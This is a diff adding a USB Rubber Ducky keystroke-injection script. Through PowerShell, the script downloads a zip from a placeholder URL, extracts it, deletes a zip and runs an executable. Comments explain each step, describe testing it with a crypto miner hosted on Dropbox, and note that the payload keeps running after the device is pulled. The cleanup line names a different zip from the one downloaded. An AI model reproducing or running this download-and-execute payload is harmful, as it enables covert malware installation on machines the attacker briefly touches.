@@ -1,0 +1,33 @@
+REM Downloads program in a zip file, then
+REM Unzips and executes it
+REM By NeonPinkQuartz
+REM 99% USING THIS IS TOTALLY ILLEGAL, THIS IS JUST A DEMO OF POWERSHELL
+REM FUNCTIONS AND WRITING SCRIPTS THAT LOAD TO THE COMPUTER
+REM AND CONTINUE TO EXECUTE WHEN THE ATTACKER LEAVES
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell
+DELAY 300
+ENTER
+DELAY 600
+STRING Invoke-WebRequest -Uri <ZIP URL> -OutFile "~\Documents\My Games\file.zip"; Expand-Archive -Path "~\Documents\My Games\file.zip" -DestinationPath "~\Documents\My Games\file"; Remove-Item "~\Documents\My Games\lolfunny.zip"; & '<EXE PATH>'
+ENTER
+REM I removed all links in this file but kept the file paths I used for clarity
+REM To save space, remove all these REM files
+REM To test this, I uploaded a crypto miner to dropbox, got the share URL, and changed
+REM ?dl=0 to ?dl=1 at the end to make sure the download could be accessed directly from the link
+REM and not just the page for the file (I think that a was important, I didn't test 0)
+REM Windows seemed to have no problem letting this run, which was great for pranks
+REM but terrifying for security
+REM -
+REM Invoke-WebRequest gets and saves the content of the URI given to it
+REM Expand-Archive Unzips path to destinationPath
+REM Remove-Item deletes the zip file (just to clean up a bit)
+REM & tells powershell to execute the given path
+REM since powershelgl opens at C:\Users\%user%, a relative path can be used from there
+REM using %user% seems to set off a red flag in powershell, but relative paths work well
+REM ; allows multiple commands to be run one after the other, so rather than running one and 
+REM guessing a wait time, the command is entered and ran all at once.
+REM once the command is typed and the download begins, the ducky can be removed and the
+REM computer will take care of the rest through the given instructions
